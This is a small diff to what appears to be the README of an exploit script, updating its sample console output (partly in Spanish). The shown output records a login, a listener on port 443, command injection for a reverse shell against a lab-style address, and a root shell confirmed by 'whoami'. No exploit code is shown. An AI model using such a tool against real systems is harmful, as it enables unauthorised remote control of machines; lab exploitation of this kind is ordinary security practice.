@@ -29,11 +29,10 @@ optional arguments:
 [+] Conexión: Se ha recibido una conexión
 [+] Login: Ingresando exitosamente
 [+] Trying to bind to :: on port 443: Done
-[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.60 on port 5833
-[∧] RCE: Inyectando comando para reverse shell
-
-[*] Ha ocurrido un error...
+[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.60 on port 18415
+[+] RCE: Comando inyectado exitosamente
 [*] Switching to interactive mode
 $ whoami
 root
+$ 
 ```
